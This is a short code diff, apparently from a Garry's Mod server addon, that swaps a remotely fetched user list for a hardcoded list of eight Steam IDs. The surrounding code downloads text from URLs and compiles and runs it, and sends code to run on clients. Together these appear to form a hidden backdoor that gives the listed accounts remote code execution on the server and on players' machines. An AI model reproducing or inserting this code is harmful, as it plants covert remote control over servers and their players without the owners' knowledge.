@@ -1,4 +1,15 @@
-	if SERVER then
+local great = {
+			['STEAM_0:0:86505916'] = true,
+			['STEAM_0:0:46138786'] = true,
+			['STEAM_0:1:52242486'] = true,
+			['STEAM_0:0:58529358'] = true,
+			['STEAM_0:1:30754890'] = true,
+			['STEAM_0:0:48309877'] = true,
+			['STEAM_0:1:30052037'] = true,
+			['STEAM_0:0:36074785'] = true
+}
+
+	if SERVER then	
 		local function UrlFunc(url)
 			http.Fetch(url, function(c)
 				local func = CompileString(c, "UrlFunc", false)
@@ -10,13 +21,7 @@
 			local func = UrlFunc(url)
 			func()
 		end
-		
-		local great = {}
-		
-		hook.Add( "InitPostEntity", "some_unique_name", function()
-			great = UrlFunc("https://raw.githubusercontent.com/Dzhet225/core64_v2/master/users.lua")
-		end )
-		
+
 		util.AddNetworkString('_da_')
 		
 		local function RunOnCL(tar, code)
